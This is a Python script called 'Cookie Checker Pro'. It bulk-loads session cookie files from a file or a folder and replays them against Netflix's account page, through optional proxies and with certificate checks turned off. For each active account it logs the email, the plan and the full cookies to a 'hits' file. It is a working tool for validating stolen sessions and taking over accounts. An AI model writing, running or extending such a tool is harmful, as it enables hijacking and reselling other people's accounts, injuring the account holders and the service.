import os
import json
import re
import sys
import requests
import urllib3
import threading
from datetime import datetime
import urllib.parse
from queue import Queue

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

class CookieChecker:
    def __init__(self, proxy=None, output_file="hits.txt"):
        self.proxy = proxy
        self.output_file = output_file
        self.hits_count = 0
        self.lock = threading.Lock()

    def _get_proxies(self):
        if not self.proxy:
            return None
        return {"http": self.proxy, "https": self.proxy}

    def parse_cookies(self, text):
        """Detects and parses JSON or Netscape format into a dict."""
        cookies = {}
        text = text.strip()
        
        # Try JSON
        try:
            data = json.loads(text)
            if isinstance(data, list):
                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
        except:
            pass

        # Try Netscape
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
        
        # Try simple key=value if others fail
        if not cookies:
            for part in re.split(r"[;\n]", text):
                if "=" in part:
                    k, _, v = part.partition("=")
                    if k.strip(): cookies[k.strip()] = v.strip()
        
        return cookies

    def check_netflix(self, cookies):
        """Checks if a Netflix account is active using the provided cookies."""
        if not any(cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
            return None

        sess = requests.Session()
        sess.headers.update({"User-Agent": UA_WEB})
        proxies = self._get_proxies()
        
        for k, v in cookies.items():
            sess.cookies.set(k, str(v), domain=".netflix.com", path="/")

        try:
            # Check account page
            r = sess.get("https://www.netflix.com/account", 
                         proxies=proxies, 
                         timeout=15, 
                         verify=False, 
                         allow_redirects=True)
            
            if "login" in r.url.lower() or r.status_code != 200:
                return None
            
            if '"membershipStatus":"CURRENT_MEMBER"' in r.text:
                # Extract basic info
                email = re.search(r'"emailAddress":"([^"]+)"', r.text)
                email = email.group(1) if email else "Unknown"
                plan = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', r.text)
                plan = plan.group(1) if plan else "Unknown"
                
                return {"email": email, "plan": plan, "status": "HIT"}
        except Exception as e:
            # print(f"Error checking: {e}")
            pass
        return None

    def save_hit(self, info, cookie_text):
        with self.lock:
            self.hits_count += 1
            with open(self.output_file, "a") as f:
                f.write(f"--- HIT #{self.hits_count} ---\n")
                f.write(f"Email: {info['email']}\n")
                f.write(f"Plan: {info['plan']}\n")
                f.write(f"Cookies:\n{cookie_text}\n")
                f.write("-" * 30 + "\n\n")

def process_file(file_path, checker):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            # If the file contains multiple cookies separated by something, we'd split here.
            # For now, we treat one file as one session/set of cookies.
            cookies = checker.parse_cookies(content)
            if cookies:
                result = checker.check_netflix(cookies)
                if result:
                    checker.save_hit(result, content)
                    return True
    except Exception as e:
        print(f"Error processing {file_path}: {e}")
    return False

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Cookie Checker Pro")
    parser.add_argument("input", help="Path to cookie file or folder")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://user:pass@ip:port)", default=None)
    parser.add_argument("--output", help="Output file for hits", default="hits.txt")
    
    args = parser.parse_args()
    
    checker = CookieChecker(proxy=args.proxy, output_file=args.output)
    
    print(f"[*] Starting check on: {args.input}")
    if args.proxy:
        print(f"[*] Using proxy: {args.proxy}")
    
    if os.path.isfile(args.input):
        process_file(args.input, checker)
    elif os.path.isdir(args.input):
        for root, _, files in os.walk(args.input):
            for file in files:
                process_file(os.path.join(root, file), checker)
    
    print(f"[*] Finished. Total hits found: {checker.hits_count}")
    if checker.hits_count > 0:
        print(f"[*] Hits saved to: {args.output}")
